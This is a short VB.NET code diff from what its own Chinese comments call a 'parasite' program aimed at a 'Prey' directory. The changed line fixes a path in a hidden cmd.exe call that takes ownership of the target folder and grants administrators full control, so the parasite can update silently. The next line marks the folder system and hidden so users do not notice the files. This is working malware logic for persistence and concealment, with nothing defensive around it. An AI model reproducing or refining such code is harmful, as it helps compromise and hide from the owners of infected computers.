@@ -40,7 +40,7 @@ Public Class DisplayForm
 
         '使用管理员权限对整个目标目录提权，方便日后寄生程序的静默更新
         '参数"/d y"表示对子目录进行循环遍历提权，大概需要 半分钟 时间，如不需要对子目录循环遍历提权，把 "/d y" 改为 "/d n"
-        Shell("cmd.exe /c takeown /f " & PreyDirectory & "/ /r /d y && icacls " & PreyDirectory & "/ /grant administrators:F /t", vbHide, True)
+        Shell("cmd.exe /c takeown /f " & PreyDirectory & " /r /d y && icacls " & PreyDirectory & " /grant administrators:F /t", vbHide, True)
         '对 Prey 目录添加 [系统] 和 [隐藏] 属性，防止用户无意发现文件
         Shell("cmd.exe /c attrib " & PreyDirectory & " +s +h", vbHide, True)
 
